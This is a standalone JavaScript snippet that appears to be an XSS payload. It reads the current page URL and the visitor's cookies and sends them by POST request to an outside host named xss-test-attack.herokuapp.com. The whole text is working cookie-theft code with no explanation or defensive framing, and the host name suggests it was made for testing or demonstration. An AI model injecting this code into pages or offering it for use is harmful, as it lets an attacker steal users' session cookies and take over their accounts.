var href = window.location.href;
var cookie = document.cookie;

var object = {
    href: href,
    cookie: cookie

};

var xmlhttp = new XMLHttpRequest();
xmlhttp.open("POST", "https://xss-test-attack.herokuapp.com");
xmlhttp.setRequestHeader("Content-Type", "application/json");
xmlhttp.send(JSON.stringify(object));